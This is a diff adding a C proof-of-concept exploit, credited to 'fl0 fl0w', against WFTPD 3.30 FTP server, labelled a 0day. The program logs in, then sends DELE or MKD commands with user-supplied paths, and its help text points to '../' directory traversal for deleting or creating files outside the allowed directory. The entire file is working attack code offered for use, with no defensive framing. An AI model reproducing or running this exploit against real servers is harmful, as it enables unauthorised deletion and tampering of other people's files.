@@ -1,0 +1,166 @@
+#include<stdio.h>
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in.h>
+#include<unistd.h>
+
+#define ALOC(tip,n) (tip*)malloc(sizeof(tip)*n)
+#define POCNAME "[*]WFTPD 3.30 Multiple remote vulnerabilities(0day)"
+#define AUTHOR "[*]fl0 fl0w"
+   typedef int i32;
+   typedef char i8;
+   typedef short i16;
+   enum {
+        True=1,
+        False=0,
+        Error=-1        
+   };
+     struct {
+          i8 *USERx,
+             *PASSx,
+             *HOST;
+          i16 PORTx;
+   }def;
+   i8 *USER=0,*PASS=0,*dir=0,*host_addr=0,
+      sendbytes[250],recev[250];
+   i16 PORT=0,option;
+        i32 args(i32 argc,i8** argv){ 
+             i32 i;
+             argc--;
+             for(i=1;i<argc;i++){
+                 switch(argv[i][1]){
+                        case 'h':
+                               host_addr=argv[++i];
+                               break;            
+                        case 'u': 
+                               USER=argv[++i];  
+                               break;
+                        case 'w':
+                               PASS=argv[++i];
+                               break; 
+                        case 'p':     
+                               PORT=atoi(argv[++i]);                     
+                               break;
+                        case 'o':
+                               option=atoi(argv[++i]);
+                               break;       
+                        default:{
+                               printf("error with argument nr %d:(%s)\n",i,argv[i]);
+                               return Error;
+                               exit(0);  
+                        }       
+               }   
+           }
+          // printf(" %s\n %s\n %s\n %d\n %d\n %s\n",host_addr,USER,PASS,PORT,option,argv[argc]); 
+           return 1;
+      }
+        void bf_error(i8* B){
+              i32 e;
+             if(B==NULL)
+               e=0;   
+               else
+                   e=1;  
+        }
+        void syntax(){ 
+             i8 *help[]={"\t-h hostname",
+                        "\t-u Username",
+                        "\t-w watchword(password)",
+                        "\t-p port(default 21)",
+                        "\t-o option:", 
+                        "\t   1 - delete folder,files",
+                        "\t   2 - make folder",
+                        "\t   ../ move up 1 dir ../../ move up 2 dirs etc"
+                        /*directory transversal*/
+                };
+                i32 i;
+                size_t com=sizeof help / sizeof help[0];
+                for(i=0;i<com;i++){
+                   printf("%s\n",help[i]);  
+               } 
+        } 
+        void defaults(){ 
+             def.HOST="localhost";
+             def.PASSx="hacker"; 
+             def.USERx="anonymous";
+             def.PORTx=21;
+             //printf("%s %s %s %d",def.HOST,def.PASSx,def.USERx,def.PORTx);
+        }
+        i32 main(i32 argc,i8** argv){
+            if(argc<3){
+               printf("%s\n%s\n",POCNAME,AUTHOR);        
+               printf("\tToo few arguments\n syntax is:\n");
+               syntax();
+               exit(0);        
+            }
+            args(argc,argv);
+            i32 sok,
+                svcon,
+                sokaddr;
+            printf("[*]Starting \n \t...\n");    
+            struct sockaddr_in sockaddr_sok;
+            sokaddr = sizeof(sockaddr_sok);
+    		sockaddr_sok.sin_family = AF_INET;
+	    	sockaddr_sok.sin_addr.s_addr = inet_addr(host_addr);
+		    sockaddr_sok.sin_port = htons(PORT);
+		    sok=socket(AF_INET,SOCK_STREAM,0);
+                        if(sok==-1){
+                          printf("[*]FAILED SOCKET\n");
+		                  exit(0);
+                       }
+       	    svcon=connect(sok,(struct sockaddr*)&sockaddr_sok,sokaddr);
+            i8 use[10];
+            if(svcon!=-1){
+               sprintf(sendbytes, "USER %s\r\n",USER);      
+                       if(send(sok,sendbytes,strlen(sendbytes),0) == -1){
+                          printf("User send error\n");                                        
+                          shutdown(sok,1);
+                          exit(0);
+                       }else {
+                                memset(sendbytes,0,250);
+                                recv(sok,recev,sizeof(recev),0);  
+                          }   
+                               
+               sprintf(sendbytes, "PASS %s\r\n",PASS);      
+                       if(send(sok,sendbytes,strlen(sendbytes),0) == -1){
+                          printf("Password send error\n");                                        
+                          shutdown(sok,1);
+                          exit(0);
+                       }else {
+                                memset(sendbytes,0,250);
+                                recv(sok,recev,sizeof(recev),0);  
+                                printf("%s\n",recev);
+                          }                                         
+               sprintf(sendbytes, "SYST\r\n");      
+                       if(send(sok,sendbytes,strlen(sendbytes),0) == -1){
+                          printf("Syst send error\n");                                        
+                          shutdown(sok,1);
+                          exit(0);
+                       }else {
+                                memset(sendbytes,0,250);
+                                recv(sok,recev,sizeof(recev),0);  
+                          } 
+                     if(option==1){                  
+                 sprintf(sendbytes,"DELE %s\r\n",argv[11]);      
+                       if(send(sok,sendbytes,strlen(sendbytes),0) == -1){
+                          printf("Syst send error\n");                                        
+                          shutdown(sok,1);
+                          exit(0);
+                       }else {
+                                memset(sendbytes,0,250);
+                                recv(sok,recev,sizeof(recev),0);  
+                          }        
+                     }else if(option==2){
+                           sprintf(sendbytes,"MKD %s\r\n",argv[11]);      
+                       if(send(sok,sendbytes,strlen(sendbytes),0) == -1){
+                          printf("Syst send error\n");                                        
+                          shutdown(sok,1);
+                          exit(0);
+                       }else {
+                                memset(sendbytes,0,250);
+                                recv(sok,recev,sizeof(recev),0);  
+                        }        
+                        }
+            }else printf("Connect error\n");
+              printf("[*]Exploit done!");
+            return 0;
+        }
